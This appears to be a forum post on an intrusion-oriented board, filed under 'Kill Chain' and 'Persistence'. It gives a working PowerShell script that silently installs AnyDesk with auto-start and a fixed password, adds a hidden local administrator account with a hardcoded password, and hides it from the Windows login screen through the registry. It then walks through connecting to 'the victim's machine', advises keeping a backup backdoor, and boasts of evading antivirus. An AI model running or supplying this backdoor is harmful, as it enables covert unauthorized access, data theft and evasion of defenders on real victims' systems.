@@ -1,0 +1,99 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Persistence "
+    Anydesk
+
+Anydesk
+Alter - 1 - 45
+" previous topic next topic "
+
+Pages: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        View Profile Private Message (Offline)
+
+: February 05, 2021, 11:32:35 am
+Written by
+
+edited by rozetka >
+Cite
+
+    Function AnyDesk {
+
+    mkdir "C:\ProgramData\AnyDesk"
+    # Download AnyDesk
+    $clnt = new-object System.Net.WebClient
+    $url = "http://download.anydesk.com/AnyDesk.exe"
+    $file = "C:\ProgramData\AnyDesk.exe"
+    $clnt.DownloadFile($url,$file)
+
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+
+
+    cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+
+
+    net user oldadministrator "qc69t4B#Z0kE3" /add
+    net localgroup Administrators oldadministrator /ADD
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+
+    }
+
+    AnyDesk
+
+
+Running the code in Powershell ISE Run As Admin
+Get ID
+We save it to ourselves
+We download Anydesk on a separate virtual desktop and give it an ID.
+Press Console Account
+Enter password
+Quote
+
+    J9kzQ2Y0qO
+
+And then log in with a local administrator or domain account and take advantage of Anydesk
+You can also download/download to the victim's machine, which can be useful in inspecting and searching documentation point by point.
+
+May have glitches. Did not come back after a reboot. Have a backup backdoor
+
+Bypasses Cylance Protect and most AVs as of 11.02.2020 because the software is signed and used in administration.
+
+by Rozetka
+" Last edited: Feb 11, 2021, 02:36:39 pm by Rozetka "
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Persistence "
+    Anydesk
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
